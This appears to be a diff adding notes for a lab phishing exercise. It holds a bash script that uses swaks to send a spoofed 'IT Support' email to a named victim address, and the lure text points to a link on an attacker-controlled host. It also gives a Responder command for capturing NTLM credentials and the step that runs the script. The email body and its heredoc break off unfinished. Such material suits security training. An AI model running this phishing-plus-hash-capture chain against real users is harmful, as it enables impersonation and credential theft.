@@ -1,0 +1,41 @@
+"""""""""""""""script""""""""""""""""""""""
+
+ GNU nano 8.4                   send_unc_mail.sh                            
+#!/bin/bash
+
+# Configuration
+VICTIM="user2@lab.local"
+FROM="itsupport@lab.local"
+SMTP_SERVER="192.168.101.10"
+PORT="587"
+LINK_PATH="http://192.168.1.100/share/document-update"
+SUBJECT="[IT Support] Urgent Policy Update"
+
+# Utiliser une chaîne multi-lignes avec cat <<EOF
+swaks --to "$VICTIM" \
+      --from "$FROM" \
+      --server "$SMTP_SERVER" \
+      --port "$PORT" \
+      --tls \
+      --data "$(cat <<EOF
+Subject: $SUBJECT
+
+Hi,
+
+We’ve recently updated our internal documentation system.
+Please review the document using the secure link below:
+
+""""""""""""""""""""""""""""""""""""""""""""""""""
+
+
+"""""""""""Responder command""""""""""""""""""""""
+
+sudo responder -I eth0   
+
+""""""""""""""""""""""""""""""""""""""""""""""""""
+
+""""""""""""run"""""""""""""""""""""""""""""""""""
+
+ ./send_unc_mail.sh 
+
+"""""""""""""""""""""""""""""""""""""""""""""""""
